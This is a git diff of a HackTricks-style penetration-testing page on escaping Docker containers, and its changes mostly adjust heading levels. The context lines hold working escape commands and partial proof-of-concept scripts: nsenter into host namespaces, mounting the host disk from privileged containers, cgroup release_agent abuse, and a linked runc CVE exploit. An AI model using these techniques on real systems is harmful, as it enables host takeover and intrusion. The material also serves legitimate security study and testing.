@@ -17,9 +17,7 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 </details>
 
 
-# Docker Breakout / Privilege Escalation
-
-## Automatic Enumeration & Escape
+# Automatic Enumeration & Escape
 
 * [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): It can also **enumerate containers**
 * [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): This tool is pretty **useful to enumerate the container you are into even try to escape automatically**
@@ -27,7 +25,7 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * [**deepce**](https://github.com/stealthcopter/deepce): Tool to enumerate and escape from containers
 * [**grype**](https://github.com/anchore/grype): Get the CVEs contained in the software installed in the image
 
-## Mounted Docker Socket Escape
+# Mounted Docker Socket Escape
 
 If somehow you find that the **docker socket is mounted** inside the docker container, you will be able to escape from it.\
 This usually happen in docker containers that for some reason need to connect to docker daemon to perform actions.
@@ -64,7 +62,7 @@ Additionally, pay attention to the runtime sockets of other high-level runtimes:
 * ...
 {% endhint %}
 
-## Capabilities Abuse Escape
+# Capabilities Abuse Escape
 
 You should check the capabilities of the container, if it has any of the following ones, you might be able to scape from it: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
@@ -80,7 +78,7 @@ In the following page you can **learn more about linux capabilities** and how to
 [linux-capabilities.md](../linux-capabilities.md)
 {% endcontent-ref %}
 
-## Escape from Privileged Containers
+# Escape from Privileged Containers
 
 A privileged container can be created with the flag `--privileged` or disabling specific defenses:
 
@@ -99,7 +97,7 @@ The `--privileged` flag introduces significant security concerns, and the exploi
 [docker-privileged.md](docker-privileged.md)
 {% endcontent-ref %}
 
-### Privileged + hostPID
+## Privileged + hostPID
 
 With these permissions you can just **move to the namespace of a process running in the host as root** like init (pid:1) just running: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
 
@@ -109,7 +107,7 @@ Test it in a container executing:
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
 
-### Privileged
+## Privileged
 
 Just with the privileged flag you can try to **access the host's disk** or try to **escape abusing release\_agent or other escapes**.
 
@@ -119,7 +117,7 @@ Test the following bypasses in a container executing:
 docker run --rm -it --privileged ubuntu bash
 ```
 
-#### Mounting Disk - Poc1
+### Mounting Disk - Poc1
 
 Well configured docker containers won't allow command like **fdisk -l**. However on miss-configured docker command where the flag `--privileged` or `--device=/dev/sda1` with caps is specified, it is possible to get the privileges to see the host drive.
 
@@ -134,15 +132,15 @@ mount /dev/sda1 /mnt/hola
 
 And voilà ! You can now access the filesystem of the host because it is mounted in the `/mnt/hola` folder.
 
-#### Mounting Disk - Poc2
+### Mounting Disk - Poc2
 
 Within the container, an attacker may attempt to gain further access to the underlying host OS via a writable hostPath volume created by the cluster. Below is some common things you can check within the container to see if you leverage this attacker vector:
 
 ```bash
-#### Check if You Can Write to a File-system
+### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
 
-#### Check root UUID
+### Check root UUID
 cat /proc/cmdline
 BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300
 
@@ -155,11 +153,11 @@ mkdir /mnt-test
 mount /dev/sda1 /mnt-test
 mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.
 
-#### debugfs (Interactive File System Debugger)
+### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
 
-#### Privileged Escape Abusing release\_agent - PoC1
+### Privileged Escape Abusing release\_agent - PoC1
 
 {% code title="Initial PoC" %}
 ```bash
@@ -167,7 +165,7 @@ debugfs /dev/sda1
 # docker run --rm -it --privileged ubuntu bash
 
 # Finds + enables a cgroup release_agent
-## Looks for something like: /sys/fs/cgroup/*/release_agent
+# Looks for something like: /sys/fs/cgroup/*/release_agent
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 # If "d" is empty, this won't work, you need to use the next PoC
 
@@ -197,7 +195,7 @@ cat /o
 ```
 {% endcode %}
 
-#### Privileged Escape Abusing release\_agent - PoC2
+### Privileged Escape Abusing release\_agent - PoC2
 
 {% code title="Second PoC" %}
 ```bash
@@ -249,7 +247,7 @@ Find an **explanation of the technique** in:
 [docker-release\_agent-cgroups-escape.md](docker-breakout-privilege-escalation/docker-release\_agent-cgroups-escape.md)
 {% endcontent-ref %}
 
-#### Privileged Escape Abusing release\_agent without known the relative path - PoC3
+### Privileged Escape Abusing release\_agent without known the relative path - PoC3
 
 In the previous exploits the **absolute path of the continer inside the hosts filesystem is disclosed**. However, this isn’t always the case. In cases where you **don’t know the absolute path of the continer inside the host** you can use this technique:
 
@@ -347,7 +345,7 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
 
-#### Privileged Escape Abusing Sensitive Mounts
+### Privileged Escape Abusing Sensitive Mounts
 
 There are several files that might mounted that give **information about the underlaying host**. Some of them may even indicate **something to be executed by the host when something happens** (which will allow a attacker to escape from the container).\
 The abuse of these files may allow that:
@@ -364,7 +362,7 @@ However, you can find **other sensitive files** to check for in this page:
 [sensitive-mounts.md](docker-breakout-privilege-escalation/sensitive-mounts.md)
 {% endcontent-ref %}
 
-### Arbitrary Mounts
+## Arbitrary Mounts
 
 In several occasions you will find that the **container has some volume mounted from the host**. If this volume wasn’t correctly configured you might be able to **access/modify sensitive data**: Read secrets, change ssh authorized\_keys…
 
@@ -372,7 +370,7 @@ In several occasions you will find that the **container has some volume mounted 
 docker run --rm -it -v /:/host ubuntu bash
 ```
 
-### hostPID
+## hostPID
 
 If you can access the processes of the host you are going to be able to access a lot of sensitive information stored in those processes. Run test lab:
 
@@ -411,7 +409,7 @@ You can also **kill processes and cause a DoS**.
 If you somehow has privileged **access over a process outside of the container**, you could run something like `nsenter --target <pid> --all` or `nsenter --target <pid> --mount --net --pid --cgroup` to **run a shell with the same ns restrictions** (hopefully none) **as that process.**
 {% endhint %}
 
-### hostNetwork
+## hostNetwork
 
 ```
 docker run --rm -it --network=host ubuntu bash
@@ -432,7 +430,7 @@ You will be able also to access **network services binded to localhost** inside 
 [kubernetes-access-to-other-clouds.md](../../../cloud-security/pentesting-kubernetes/kubernetes-access-to-other-clouds.md)
 {% endcontent-ref %}
 
-### hostIPC
+## hostIPC
 
 ```
 docker run --rm -it --ipc=host ubuntu bash
@@ -443,9 +441,9 @@ If you only have `hostIPC=true`, you most likely can't do much. If any process o
 * **Inspect /dev/shm** - Look for any files in this shared memory location: `ls -la /dev/shm`
 * **Inspect existing IPC facilities** – You can check to see if any IPC facilities are being used with `/usr/bin/ipcs`. Check it with: `ipcs -a`
 
-## CVEs
+# CVEs
 
-### Runc exploit (CVE-2019-5736)
+## Runc exploit (CVE-2019-5736)
 
 In case you can execute `docker exec` as root (probably with sudo), you try to escalate privileges escaping from a container abusing CVE-2019-5736 (exploit [here](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). This technique will basically **overwrite** the _**/bin/sh**_ binary of the **host** **from a container**, so anyone executing docker exec may trigger the payload.
 
@@ -462,9 +460,9 @@ For more information: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape
 There are other CVEs the container can be vulnerable too, you can find a list in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
 {% endhint %}
 
-## Breakout Templates
+# Breakout Templates
 
-### Container Breakout through Usermode helper Template
+## Container Breakout through Usermode helper Template
 
 If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):
 
@@ -476,7 +474,7 @@ If you are in **userspace** (**no kernel exploit** involved) the way to find new
 * Have **enough capabilities and disabled protections** to be able to abuse that functionality
   * You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container
 
-## References
+# References
 
 * [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
 * [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
